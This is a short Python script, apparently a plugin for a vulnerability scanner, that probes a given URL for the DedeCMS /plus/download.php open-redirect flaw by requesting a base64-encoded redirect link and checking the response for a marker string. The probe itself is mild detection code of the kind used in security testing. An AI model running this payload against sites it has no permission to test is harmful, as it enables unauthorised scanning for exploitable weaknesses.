#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20"
bug ="--STATUS OK--"
info ="/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20  存在Dedecms /plus/download.php"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
